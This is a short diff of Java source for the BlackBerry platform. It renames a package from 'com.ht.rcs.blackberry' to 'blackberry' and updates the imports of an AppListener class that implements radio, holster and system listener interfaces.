@@ -1,11 +1,11 @@
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import net.rim.device.api.system.HolsterListener;
 import net.rim.device.api.system.RadioStatusListener;
 import net.rim.device.api.system.SystemListener;
 
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class AppListener implements RadioStatusListener, HolsterListener,
         SystemListener {
